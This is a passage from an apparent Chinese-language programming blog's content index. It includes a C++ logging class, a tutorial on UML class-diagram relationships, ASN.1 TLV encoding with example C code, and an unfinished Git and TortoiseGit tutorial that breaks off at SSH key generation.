ICLevelName[] = &#123; \"NOLOG\", \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" &#125;;ItcastLog::ItcastLog()&#123;&#125;ItcastLog::~ItcastLog()&#123;&#125;int ItcastLog::ITCAST_Error_GetCurTime(char *strTime)&#123; struct tm* tmTime = NULL; size_t timeLen = 0; time_t tTime = 0; tTime = time(NULL); tmTime = localtime(&amp;tTime); //timeLen = strftime(strTime, 33, \"%Y(Y)%m(M)%d(D)%H(H)%M(M)%S(S)\", tmTime); timeLen = strftime(strTime, 33, \"%Y.%m.%d %H:%M:%S\", tmTime); return timeLen;&#125;int ItcastLog::ITCAST_Error_OpenFile(int *pf)&#123; char fileName[1024]; memset(fileName, 0, sizeof(fileName));#ifdef WIN32 sprintf(fileName, \"d:\\\\%s\", ITCAST_DEBUG_FILE.data());#else sprintf(fileName, \"./log/%s\", ITCAST_DEBUG_FILE.data());#endif#if 0 *pf = open(fileName, O_WRONLY | O_CREAT | O_APPEND, 0666); if (*pf &lt; 0) &#123; return -1; &#125;#endif return 0;&#125;void ItcastLog::ITCAST_Error_Core(const char *file, int line, int level, int status, const char *fmt, va_list args)&#123; char str[ITCAST_MAX_STRING_LEN]; int strLen = 0; char tmpStr[64]; int tmpStrLen = 0; int pf = 0; //初始化 memset(str, 0, ITCAST_MAX_STRING_LEN); memset(tmpStr, 0, 64); //加入LOG时间 tmpStrLen = ITCAST_Error_GetCurTime(tmpStr); tmpStrLen = sprintf(str, \"[%s] \", tmpStr); strLen = tmpStrLen; //加入LOG等级 tmpStrLen = sprintf(str + strLen, \"[%s] \", ICLevelName[level].data()); strLen += tmpStrLen; //加入LOG状态 if (status != 0) &#123; tmpStrLen = sprintf(str + strLen, \"[ERRNO is %d] \", status); &#125; else &#123; tmpStrLen = sprintf(str + strLen, \"[SUCCESS] \"); &#125; strLen += tmpStrLen; //加入LOG信息 tmpStrLen = vsprintf(str + strLen, fmt, args); strLen += tmpStrLen; //加入LOG发生文件 tmpStrLen = sprintf(str + strLen, \" [%s]\", file); strLen += tmpStrLen; //加入LOG发生行数 tmpStrLen = sprintf(str + strLen, \" [%d]\\n\", line); strLen += tmpStrLen; //打开LOG文件 if (ITCAST_Error_OpenFile(&amp;pf)) &#123; return; &#125;#if 0 //写入LOG文件 write(pf, str, strLen); //IC_Log_Error_WriteFile(str); //关闭文件 close(pf);#endif return;&#125;void ItcastLog::Log(const char *file, int line, int level, int status, const char *fmt, ...)&#123; va_list args; //判断是否需要写LOG if (level == NOLOG) &#123; return; &#125; //调用核心的写LOG函数 va_start(args, fmt); ITCAST_Error_Core(file, line, level, status, fmt, args); va_end(args); return;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"UML类图_常见的报文编码方式_ASN1报文编解码_vs连接linux服务器","slug":"UML类图-常见的报文编码方式-ASN1报文编解码-vs连接linux服务器","date":"2022-05-21T03:32:04.000Z","updated":"2022-05-21T21:24:30.994Z","comments":true,"path":"2022/05/21/UML类图-常见的报文编码方式-ASN1报文编解码-vs连接linux服务器/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/21/UML类图-常见的报文编码方式-ASN1报文编解码-vs连接linux服务器/","excerpt":"","text":"两台机器通信 1 两台机器的操作系统平台不同: 一台是32为windows, 一台是linux 64系统 不同的平台对数据的处理都可能不一样,比如在windows中的int类型是4个字节,在linux中可能是2个字节。 2 网络传输的时候用的是大端模式 只要是传输的数据的数据类型超过了一个字节都需要进行网络字节序的转换 关于字节序序的函数: 12htons htonl ntohs ntohl h: host to: 到 n: network l: long s: short ​ 假如在从A传递数据给B, 需要传递一个结构体 3 字节序对齐不一样 123456struct test&#123; int a; char c; double d;&#125; 4 两台服务的开发语言不同 对于C语言, 一个字符占用一个字节 对于java, 一个字符占用2个字节 报文: 其实就是数据. 上述几种情况, 涉及到网络数据传输, 都需要对数据进行编解码操作. UML类图: 1. 面向对象设计 面向对象设计主要就是使用UML的类图，类图用于描述系统中所包含的类以及它们之间的相互关系，帮助人 们简化对系统的理解，它是系统分析和设计阶段的重要产物，也是系统编码和测试的重要模型依据 类的UML画法 类（Class）封装了数据和行为，是面向对象的重要组成部分，它是具有相同属性、操作、关系的对象集合的 总称。在系统中，每个类都具有一定的职责，职责指的是类要完成什么样子的功能，要承担什么样子的义 务。一个类可以有多种职责，但是设计得好的类一般只有一种职责。 假如我现在定义了这么一个类： 1234567891011121314151617181920212223242526class Persion &#123;public: string getName() &#123; return name; &#125; void setName(string name) &#123; this-&gt;name = name; &#125; protected: void playBasketball() &#123; pass(); &#125;private: void pass() &#123; &#125; private: string name = &quot;Jack&quot;; &#125;; 那么此类对应的UML为： 看到该图分为三层：最顶层的为类名，中间层的为属性，最底层的为方法。 属性的表示方式为：【可见性】【属性名称】：【类型】={缺省值，可选} 方法的表示方式为：【可见性】【方法名称】（【参数列表】）：【类型】 可见性都是一样的，&quot;-“表示private、”+“表示public、”#&quot;表示protected。 3. 继承关系 继承也叫作泛化（Generalization），用于描述父子类之间的关系，父类又称为基类或者超类，子类又称作 派生类。在UML中，泛化关系用带空心三角形的实线来表示。 3.1 普通继承关系 假如现在我又定义了一个Student和一个Teacher： 1234567891011121314151617181920class Student : public Persion &#123;public: void study() &#123;&#125; private: string studentNo; &#125;;class Teacher : public Persion &#123;public: void teach() &#123;&#125; private: string teacherNo; &#125;; 那么，用UML表示这种关系应当是： 3.2 抽象继承关系 上面的继承是普通的继承，在C++中，除了普通的继承之外，众所周知的还有一种抽象的继承关系，因此就 再讲讲抽象继承关系，作为上面的继承的补充。 比方说我想实现一个链表（Link），插入（insert）与删除（remove）动作我想让子类去实现，链表本身只 实现统计链表中元素个数的动作（count），然后有一个子类单向链表（OneWayLink）去实现父类没有实现 的动作，C++代码为： 123456789101112131415161718192021222324252627282930// 抽象类(含有纯虚函数的类)class Link &#123;public: virtual void insert() = 0; virtual void remove() = 0; int count() &#123; return 0; &#125; &#125;;// 子类 class OneWayLink : public Link &#123;public: void insert() &#123; &#125; void remove() &#123; &#125;&#125;; 其UML的画法为： 在UML中，抽象类无论类名还是抽象方法名，都以斜体的方式表示，因为这也是一种继承关系，所以子类与父类通过带空心三角形的实线来联系。 4. 关联关系 关联（Assocition）关系是类与类之间最常见的一种关系，它是一种结构化的关系，表示一类对象与另一类 对象之间有联系，如汽车和轮胎、师傅和徒弟、班级和学生等。在UML类图中，用实线连接有关联关系的对 象所对应的类，在C++中通常将一个类的对象作为另一个类的成员变量。关联关系分单向关联、双向关联、 自关联，逐一看一下。 4.1 单向关联关系 单向关联指的是关联只有一个方向，比如顾客（Customer）拥有地址（Address），其代码实现为: 1234567891011// 地址类 class Address &#123;&#125;;// 顾客类 class Customer &#123;private: Address address; // 作为成员变量 &#125;; UML的画法为： 4.2 双向关联关系 默认情况下的关联都是双向的，比如顾客（Customer）购买商品（Product），反之，卖出去的商品总是与 某个顾客与之相关联，这就是双向关联。c++ 类的写法为： 1234567891011// 商品类 class Product &#123;private: Customer customer; // 该商品属于哪一位顾客, 作为成员变量 &#125;;// 顾客类 class Customer &#123;private: Product product[64]; // 给顾客购买了哪些商品, 作为成员变量 &#125;; 对应的UML类图应当是： 4.3 自关联关系 自关联，指的就是对象中的属性为对象本身，这在链表中非常常见，单向链表Node中会维护一个它的前驱 Node，双向链表Node中会维护一个它的前驱Node和一个它的后继Node。就以单向链表为例，它的C++写 法为： 123456// 链表节点 class Node &#123;private: Node* nextNode; // 指向后继节点的指针, 作为成员变量 &#125;; 对应的UML类图应当是： 5. 聚合关系 聚合（Aggregation）关系表示整体与部分的关系。在聚合关系中，成员对象是整体的一部分，但是成员对象 可以脱离整体对象独立存在。在UML中， 聚合关系用带空心菱形的直线表示，如汽车（Car）与引擎（Engine）、轮胎（Wheel）、车灯（Light），C++ 表示为： 12345678910111213141516171819202122232425262728class Engine &#123;&#125;;class Wheel &#123;&#125;;class Light &#123;&#125;;class Car &#123;public: Car(Engine engine, Light light, Wheel wheel) &#123; this-&gt;engine = engine; this-&gt;light = light; this-&gt;wheel = wheel; &#125; void drive() &#123;&#125; private: Engine engine; Light light; Wheel wheel; &#125;; 对应的UML类图为： 代码实现聚合关系，成员对象通常以构造方法、Setter方法的方式注入到整体对象之中。 6. 组合关系 组合（Composition）关系也表示的是一种整体和部分的关系，但是在组合关系中整体对象可以控制成员对 象的生命周期，一旦整体对象不存在，成员对象也不存在，整体对象和成员对象之间具有同生共死的关系。 在UML中组合关系用带实心菱形的直线表示。 比如人的头（Head）和嘴巴（Mouth）、鼻子（Nose），嘴巴和鼻子是头的组成部分之一，一旦头没了， 嘴巴也没了，因此头和嘴巴、鼻子是组合关系，C++ 表示为： 123456789101112131415161718192021222324class Mouth &#123;&#125;;class Nose &#123;&#125;;class Head &#123;public: Head() &#123; mouth = new Mouth(); nose = new Nose(); &#125; void shake() &#123; &#125; private: Mouth *mouth; Nose *nose;&#125;; 其UML的表示方法为： 代码实现组合关系，通常在整体类的构造方法中直接实例化成员类，因为组合关系的整体和部分是共生关 系，如果通过外部注入，那么即使整体不存在，那么部分还是存在的，这就相当于变成了一种聚合关系了。 7. 依赖关系 依赖（Dependency）关系是一种使用关系，特定事物的改变有可能会影响到使用该事物的其他事物，在需 要表示一个事物使用另一个事物时使用依赖关系，大多数情况下依赖关系体现在某个类的方法使用另一个类 的对象作为参数。在UML中，依赖关系用带箭头的虚线表示，由依赖的一方指向被依赖的一方。 比如，驾驶员（Driver）开车，Driver类的drive()方法将车（Car）的对象作为一个参数传递，以便在drive() 方法中能够调用car的move()方法，且驾驶员的drive()方法依赖车的move()方法，因此也可以说Driver依赖 Car，C++代码为： 123456789101112131415class Car &#123;public: void move(); &#125;;class Driver &#123;public: void drive(Car car) &#123; car.move(); &#125;&#125;; 其UML的画法为： 依赖关系通常通过三种方式来实现： 将一个类的对象作为另一个类中方法的参数 在一个类的方法中将另一个类的对象作为其对象的局部变量 在一个类的方法中调用另一个类的静态方法 8. 关联关系、聚合关系、组合关系之间的区别 从上文可以看出，关联关系、聚合关系和组合关系三者之间比较相似，本文的最后就来总结一下这三者之间 的区别。 关联和聚合的区别主要在于语义上：关联的两个对象之间一般是平等的，聚合则一般是不平等的。 聚合和组合的区别则在语义和实现上都有差别：组合的两个对象之间生命周期有很大的关联，被组合的对象 在组合对象创建的同时或者创建之后创建，在组合对象销毁之前销毁，一般来说被组合对象不能脱离组合对 象独立存在，而且也只能属于一个组合对象；聚合则不一样，被聚合的对象可以属于多个聚合对象。 再举例子来说： 你和你的朋友属于关联关系，因为你和你的朋友之间的关系是平等的，关联关系只是表示一下两个对象 之间的一种简单的联系而已，就像我有一个朋友 你和你借的书属于聚合关系，第一是因为书可以独立存在，第二是因为书不仅仅属于你，也可以属于别 人，只是暂时你拥有 你和你的心脏属于组合关系，因为你的心脏只是属于你的，不能脱离与你而存在 不过，实际应用中，我个人感觉三种关系其实没有区分得这么清楚，有些架构师甚至会说&quot;组合和聚合没什么 区别&quot;，所以，有时候不需要把细节扣得这么细，合理利用对象之间的关系给出设计方案即可。 常用的几种序列化方式 XML类似于HTML，与HTML很相似，但是用它来序列化对象的时候，就显得很复杂 JSON使用起来很简单，他的产生来自于一种关联数组，其本质是采用“键值对”的方式描述对象 Protocol Buffer是一个高效的数据化数据存储格式，用于结构化数据串行化，很适合做数据储存或RPC数据交换格式 ASN.1抽象语法标记 boost 序列化的类 自定义的格式 ASN.1 头文件和源代码下载地址:https://gitee.com/xiaochenyan/mypro/tree/master/多端安全协议传输平台/参考代码 描述了对一种数据进行表示、编码、传输和解码的数据格式。 ASN.1它有两部分 一部分描述信息内数据，数据类型及序列格式； 相当于属性 一部分描述如何将各个部分组成消息 相当于方法 编码格式（TLV） TAG（type） LENGTH VALUE 数据类型 数据长度 数据的值 1234typedef struct _Persion&#123; int age; char name[64];&#125;Persion; 123456789101112typedef struct ITCAST_ANYBUF_ &#123; unsigned char *pData; // 数据值 ITCAST_UINT32 dataLen; // 数据长度 ITCAST_UINT32 unusedBits; /* for bit string */ ITCAST_UINT32 memoryType; ITCAST_UINT32 dataType; // 数据类型 struct ITCAST_ANYBUF_ *next; /* for sequence and set */ struct ITCAST_ANYBUF_ *prev;&#125;ITCAST_ANYBUF; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384ITCAST_INT DER_ItAsn1_WriteInteger(ITCAST_UINT32 integer, ITASN1_INTEGER **ppDerInteger);函数说明:对整形数据进行编码操作函数参数: integer: 输入参数, 表示待编码的整形数据 ppDerInteger: 传出参数, 编码之后的数据返回值: 成功或者失败 ITCAST_INT DER_ItAsn1_ReadInteger(ITASN1_INTEGER *pDerInteger, ITCAST_UINT32 *pInteger);函数说明: 对整形数据解码参数说明: pDerInteger: 传入参数, 表示待解码的数据 pInteger: 传出参数, 表示解码之后的数据返回值: 成功或者失败 ITCAST_ANYBUF p; ITCAST_UINT32 aa; 例如: DER_ItAsn1_ReadInteger(&amp;p, &amp;aa);ITCAST_INT DER_ItAsn1_WritePrintableString(ITASN1_PRINTABLESTRING *pPrintString, ITASN1_PRINTABLESTRING **ppDerPrintString);函数说明:编码字符串数据函数参数: pPrintString: 输入参数, 表示要编码的数据 ppDerPrintString: 输出参数, 表示编码之后的数据返回值: 成功或者失败 ITCAST_INT DER_ItAsn1_ReadPrintableString(ITASN1_PRINTABLESTRING *pDerPrintString, ITASN1_PRINTABLESTRING **ppPrintString);函数说明: 解码函数, 将ANYCAST_ANYBUF类型解码到第二个参数参数说明: pDerPrintString: 输入参数, 表示待解码的数据 ppPrintString: 输出参数, 存放解码之后的数据返回值: 成功或者失败ITCAST_INT DER_ITCAST_String_To_AnyBuf(ITCAST_ANYBUF **pOriginBuf, unsigned char * strOrigin, int strOriginLen);函数说明: 将char *----&gt;ITCAST_ANYBUF类型函数参数: pOriginBuf: 传出参数, ITCAST_ANYBUF指针 strOrigin: 传入参数, 待转换的字符串 strOriginLen: 传入参数, strOrigin的字符串长度返回值: 成功或者失败int EncodeChar(char *pData, int dataLen, ITCAST_ANYBUF **outBuf);函数说明: 将char *类型数据进行编码函数参数: pData: 输入参数, 指的是待编码的字符串 dataLen: 输入参数, 指的是pData的长度 outBuf: 输出参数, ITCAST_ANYBUF类型的数据, TLV格式 int DecodeChar(ITCAST_ANYBUF *inBuf, char **Data, int *pDataLen);ITCAST_INT DER_ItAsn1_WriteSequence(ITASN1_SEQUENCE *pSequence, ITCAST_ANYBUF **ppDerSequence);函数说明: 序列化链表, 将链表序列化成字节流数据函数参数: pSequence: 输入参数, 待序列化的数据 ppDerSequence: 输出参数, 序列化之后的数据ITCAST_INT DER_ItAsn1_ReadSequence(ITCAST_ANYBUF *pDerSequence, ITASN1_SEQUENCE **ppSequence);函数说明: 反序列化参数说明: pDerSequence:输入参数, 开始需要将char *---&gt;ITCAST_ANYBUF类型 ppSequence: 输出参数, 获得链表头节点ITCAST_INT DER_ITCAST_FreeQueue(ITCAST_ANYBUF *pAnyBuf);释放内存 代码示例 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &quot;teacher.h&quot;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main()&#123; Teacher tea; memset(&amp;tea, 0x00, sizeof(Teacher)); strcpy(tea.name, &quot;路飞&quot;); tea.age = 20; tea.p = (char*)malloc(100); strcpy(tea.p, &quot;我是要成为海贼王的男人&quot;); tea.plen = strlen(tea.p); // 编码 char* outData; int outlen; encodeTeacher(&amp;tea, &amp;outData, &amp;outlen); //=============================================== // 解码 Teacher* pt; decodeTeacher(outData, outlen, &amp;pt); printf(&quot;name: %s\\n&quot;, pt-&gt;name); printf(&quot;age: %d\\n&quot;, pt-&gt;age); printf(&quot;p: %s\\n&quot;, pt-&gt;p); printf(&quot;plen: %d\\n&quot;, pt-&gt;plen); freeTeacher(&amp;pt); system(&quot;pause&quot;); return 0;&#125; Teacher.h 123456789101112131415161718192021222324252627#ifndef _TEACHER_H#define _TEACHER_Htypedef struct _Teacher&#123; char name[64]; int age; char *p; long plen;&#125;Teacher;// 编码结构体//p: 输入参数, 待编码的结构体//outData: 输出参数, 保存编码之后的字符串//outlen: 输出参数, 编码之后的字符串的长度int encodeTeacher(Teacher* p, char** outData, int* outlen);// 解码结构体//inData: 输入参数//inLen: inData的长度//p:保存解码之后的数据int decodeTeacher(char* inData, int inLen, Teacher**p);// 释放内存函数//释放内存void freeTeacher(Teacher** p);#endif // _TEACHER_H Teacher.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &quot;teacher.h&quot;#include &quot;itcast_asn1_der.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;/* typedef struct _Teacher &#123; char name[64]; int age; char *p; long plen; &#125;Teacher;*/int encodeTeacher(Teacher * p, char ** outData, int * outlen)&#123; ITCAST_ANYBUF *head = NULL; ITCAST_ANYBUF *temp = NULL; ITCAST_ANYBUF *next = NULL; //编码name //ITCAST_INT DER_ItAsn1_WritePrintableString(ITASN1_PRINTABLESTRING *pPrintString, ITASN1_PRINTABLESTRING **ppDerPrintString); //char *----&gt;ITCAST_ANYBUF DER_ITCAST_String_To_AnyBuf(&amp;temp, p-&gt;name, strlen(p-&gt;name)+1); DER_ItAsn1_WritePrintableString(temp, &amp;head); DER_ITCAST_FreeQueue(temp); next = head; //编码age DER_ItAsn1_WriteInteger(p-&gt;age, &amp;next-&gt;next); next = next-&gt;next; //编码p //int EncodeChar(char *pData, int dataLen, ITCAST_ANYBUF **outBuf); EncodeChar(p-&gt;p, strlen(p-&gt;p)+1, &amp;next-&gt;next); next = next-&gt;next; //编码plen DER_ItAsn1_WriteInteger(p-&gt;plen, &amp;next-&gt;next); //序列化 DER_ItAsn1_WriteSequence(head, &amp;temp); //输出参数赋值 *outData = temp-&gt;pData; *outlen = temp-&gt;dataLen; //释放内存 DER_ITCAST_FreeQueue(head); return 0;&#125;/* typedef struct _Teacher &#123; char name[64]; int age; char *p; long plen; &#125;Teacher;*/int decodeTeacher(char * inData, int inLen, Teacher ** p)&#123; ITCAST_ANYBUF *head = NULL; ITCAST_ANYBUF *temp = NULL; ITCAST_ANYBUF *next = NULL; Teacher *pt = (Teacher *)malloc(sizeof(Teacher)); if (pt == NULL) &#123; return -1; &#125; //将inData反序列化成链表 //将char *---&gt;ITCAST_ANYBUF类型 DER_ITCAST_String_To_AnyBuf(&amp;temp, inData, inLen); DER_ItAsn1_ReadSequence(temp, &amp;head); DER_ITCAST_FreeQueue(temp); next = head; //解码name DER_ItAsn1_ReadPrintableString(next, &amp;temp); memcpy(pt-&gt;name, temp-&gt;pData, temp-&gt;dataLen); next = next-&gt;next; DER_ITCAST_FreeQueue(temp); //解码age DER_ItAsn1_ReadInteger(next, &amp;pt-&gt;age); next = next-&gt;next; //解码p int len = 0; DecodeChar(next, &amp;pt-&gt;p, &amp;len); next = next-&gt;next; //解码plen DER_ItAsn1_ReadInteger(next, &amp;pt-&gt;plen); //给输出参数赋值 *p = pt; //释放内存 DER_ITCAST_FreeQueue(head); return 0;&#125;void freeTeacher(Teacher ** p)&#123; if ((*p) != NULL) &#123; if ((*p)-&gt;p != NULL) &#123; free((*p)-&gt;p); &#125; free(*p); &#125;&#125; vs连接linux服务器 创建项目工程 点击菜单栏上的工具----------&gt;选项 选择 跨平台-------&gt;连接管理器-----------&gt;添加 修改生成目录的路径","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"Git教程","slug":"Git教程","date":"2022-05-17T14:55:09.000Z","updated":"2022-05-20T20:59:15.766Z","comments":true,"path":"2022/05/17/Git教程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/17/Git教程/","excerpt":"","text":"1 Git历史 同生活中的许多伟大事件一样，Git 诞生于一个极富纷争大举创新的年代。Linux 内核开源项目有着为数众广的参与者。绝大多数的 Linux 内核维护工作都花在了提交补丁和保存归档的繁琐事务上（1991－2002年间）。到 2002 年，整个项目组开始启用分布式版本控制系统 BitKeeper 来管理和维护代码。 到 2005 年的时候，开发 BitKeeper 的商业公司同 Linux 内核开源社区的合作关系结束，他们收回了免费使用 BitKeeper 的权力。这就迫使 Linux 开源社区（特别是 Linux的缔造者 Linus Torvalds ）不得不吸取教训，只有开发一套属于自己的版本控制系统才不至于重蹈覆辙。他们对新的系统订了若干目标： • 速度 • 简单的设计 • 对非线性开发模式的强力支持（允许上千个并行开发的分支） • 完全分布式 • 有能力高效管理类似 Linux 内核一样的超大规模项目（速度和数据量） 2 Git与svn对比 2.1 Svn SVN（Subversion）是集中式版本控制系统，版本库是集中放在中央服务器的，而干活的时候，用的都是自己的电脑，所以首先要从中央服务器哪里得到最新的版本，然后干活，干完后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，如果在局域网还可以，带宽够大，速度够快，如果在互联网下，如果网速慢的话，就郁闷了。 下图就是标准的集中式版本控制工具管理方式： 集中管理方式在一定程度上看到其他开发人员在干什么，而管理员也可以很轻松掌握每个人的开发权限。 但是相较于其优点而言，集中式版本控制工具缺点很明显： l 服务器单点故障 l 容错性差 2.2 Git Git是分布式版本控制系统，那么它就没有中央服务器的，每个人的电脑就是一个完整的版本库，这样，工作的时候就不需要联网了，因为版本都是在自己的电脑上。既然每个人的电脑都有一个完整的版本库，那多个人如何协作呢？比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。 下图就是分布式版本控制工具管理方式： 3 git工作流程 一般工作流程如下： 1．从远程仓库中克隆 Git 资源作为本地仓库。 2．从本地仓库中checkout代码然后进行代码修改 3．在提交前先将代码提交到暂存区。 4．提交修改。提交到本地仓库。本地仓库中保存修改的各个历史版本。 5．在修改完成后，需要和团队成员共享代码时，可以将代码push到远程仓库。 下图展示了 Git 的工作流程： 4 Git的安装 最早Git是在Linux上开发的，很长一段时间内，Git也只能在Linux和Unix系统上跑。不过，慢慢地有人把它移植到了Windows上。现在，Git可以在Linux、Unix、Mac和Windows这几大平台上正常运行了。由于开发机大多数情况都是windows，所以本教程只讲解windows下的git的安装及使用。 4.1 软件下载 下载地址：https://git-scm.com/download 参考资料中安装包已经下载完毕，根据不同的操作系统选择对应的安装包。 4.2 软件安装 4.2.1 安装git for windows 一路“下一步”使用默认选项即可。 4.2.2 安装TortoiseGit 一路“下一步”使用默认选项即可。 默认选项下会启动配置画面： 由于目前只有英文语言包，默认即可继续下一步。 配置git.exe，在4.2.1中已经安装过git-for-windows了所以在此找到git.exe所在的目录。 配置开发者姓名及邮箱，每次提交代码时都会把此信息包含到提交的信息中。 使用默认配置，点击“完成”按钮完成配置。 完整完毕后在系统右键菜单中会出现git的菜单项。 4.2.3 安装中文语言包 安装中文语言包并不是必选项。可以根据个人情况来选择安装。 直接“下一步”完整完毕。 语言包安装完毕后可以在TortoiseGit的设置中调整语言 5 使用git管理文件版本 5.1 创建版本库 什么是版本库呢？版本库又名仓库，英文名repository，你可以简单理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。由于git是分布式版本管理工具，所以git在不需要联网的情况下也具有完整的版本管理能力。 创建一个版本库非常简单，可以使用git bash也可以使用tortoiseGit。首先，选择一个合适的地方，创建一个空目录。 5.1.1 使用GitBash 在桌面创建了一个 新建文件夹(2) 在该目录中点击右键中选择Git Bash来启动。 创建仓库执行命令： $ git init 5.1.2 使用TortoiseGit 使用TortoiseGit时只需要在目录中点击右键菜单选择“在这里创建版本库” 版本库创建成功，会在此目录下创建一个.git的隐藏目录，如下所示： 在windows中如何显示隐藏目录隐藏目录请自行百度o(╯□╰)o 概念： 版本库：“.git”目录就是版本库，将来文件都需要保存到版本库中。 工作目录：包含“.git”目录的目录，也就是.git目录的上一级目录就是工作目录。只有工作目录中的文件才能保存到版本库中。 5.2 添加文件 5.2.1 添加文件过程 在 桌面/新建文件夹(2) 目录下创建一个mytest.txt文件 文本文件变为带“+”号的图标： 提交文件：在mytest.txt上再次点击右键选择“提交”，此时将文件保存至版本库中。 5.2.2 工作区和暂存区 Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念。 什么是工作区（Working Directory）？ 工作区就是你在电脑里能看到的目录，比如我的 新建文件夹(2) 文件夹就是一个工作区。 有的同学可能会说新建文件夹(2)不是版本库吗怎么是工作区了？其实新建文件夹(2)目录是工作区，在这个目录中的“.git”隐藏文件夹才是版本库。这回概念清晰了吧。 Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。 如下图所示： 分支和HEAD的概念我们稍后再讲。前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的： 第一步是用git add把文件添加进去，实际上就是把文件修改添加到暂存区； 第二步是用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支。 因为我们创建Git版本库时，Git自动为我们创建了唯一一个master分支，所以，现在，git commit就是往master分支上提交更改。 你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。 5.3 修改文件 5.3.1 提交修改 被版本库管理的文件不可避免的要发生修改，此时只需要直接对文件修改即可。修改完毕后需要将文件的修改提交到版本库。 在mytest.txt文件上点击右键，然后选择“提交” 5.3.2 查看修改历史 在开发过程中可能会经常查看代码的修改历史，或者叫做修改日志。来查看某个版本是谁修改的，什么时间修改的，修改了哪些内容。 可以在文件上点击右键选择“显示日志”来查看文件的修改历史。 5.3.3 差异比较 当文件内容修改后，需要和修改之前对比一下修改了哪些内容此时可以使用“比较差异功能” 5.3.4 还原修改 当文件修改后不想把修改的内容提交，还想还原到未修改之前的状态。此时可以使用“还原”功能 *注意：此操作会撤销所有未提交的修改，所以当做还原操作是需要慎重慎重！！！* 5.4 删除文件 需要删除无用的文件时可以使用git提供的删除功能直接将文件从版本库中删除。 需要将删除操作提交到本地仓库 5.5 案例：将c++工程提交到版本库 第一步：将参考资料中的c++工程project-test复制到工作目录中 第二步：将工程添加到暂存区。 点击确定完成暂存区添加。 三、忽略文件或文件夹 在此工程中，并不是所有文件都需要保存到版本库中的例如“Debug”目录及目录下的文件就可以忽略。好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。 如果使用TortoiseGit的话可以使用菜单项直接进行忽略。 选择保留本地文件。完成后在此文件夹内会多出一个.gitignore文件，这个文件就是文件忽略文件，当然也可以手工编辑。其中的内容就是把bin目录忽略掉。 四、提交代码 将代码添加到master分支上，其中.gitignore文件也需要添加到暂存区，然后提交到版本库。 5.6 忽略文件语法规范(.gitignore文件) 空行或是以 # 开头的行即注释行将被忽略。 可以在前面添加正斜杠 / 来避免递归,下面的例子中可以很明白的看出来与下一条的区别。 可以在后面添加正斜杠 / 来忽略文件夹，例如 build/ 即忽略build文件夹。 可以使用 ! 来否定忽略，即比如在前面用了 *.apk ，然后使用 !a.apk ，则这个a.apk不会被忽略。 * 用来匹配零个或多个字符，如 *.[oa] 忽略所有以&quot;.o&quot;或&quot;.a&quot;结尾， *~ 忽略所有以 ~ 结尾的文件（这种文件通常被许多编辑器标记为临时文件）； [] 用来匹配括号内的任一字符，如 [abc] ，也可以在括号内加连接符，如 [0-9] 匹配0至9的数； ? 用来匹配单个字符。 看了这么多，还是应该来个栗子： # 忽略 .a 文件 *.a # 但否定忽略 lib.a, 尽管已经在前面忽略了 .a 文件 !lib.a # 仅在当前目录下忽略 TODO 文件， 但不包括子目录下的 subdir/TODO /TODO # 忽略 build/ 文件夹下的所有文件 build/ # 忽略 doc/notes.txt, 不包括 doc/server/arch.txt doc/*.txt # 忽略所有的 .pdf 文件 在 doc/ directory 下的 doc/**/*.pdf 6 远程仓库 6.1 添加远程库 现在我们已经在本地创建了一个Git仓库，又想让其他人来协作开发，此时就可以把本地仓库同步到远程仓库，同时还增加了本地仓库的一个备份。 常用的远程仓库就是github：https://github.com/，接下来我们演示如何将本地代码同步到github。 码云: https://gitee.com/ 6.1.1 在github上创建仓库 首先你得在github上创建一个账号，这个就不演示了。然后在github上创建一个仓库： 点击“create repository”按钮仓库就创建成功了。 Github支持两种同步方式“https”和“ssh”。如果使用https很简单基本不需要配置就可以使用，但是每次提交代码和下载代码时都需要输入用户名和密码。而且如果是公司配置的私有git服务器一般不提供hppts方式访问，所以我们着重讲“ssh”方式。 6.1.2 https方式同步远程仓库 对于新创建的远程仓库(还没有分支的)可以直接通过https地址将本地仓库内容直接推送过去, 找到本地仓库目录, 鼠标右键选择: git 同步 6.1.3 ssh协议 6.1.3.1 什么是ssh? SSH是英文Secure Shell的简写形式。通过使用SSH，你可以把所有传输的数据进行加密，这样&quot;中间人&quot;这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、Pop、甚至为PPP提供一个安全的&quot;通道&quot;。 如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。 最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。 6.1.3.2 ssh密钥生成 在windows下我们可以使用 Git 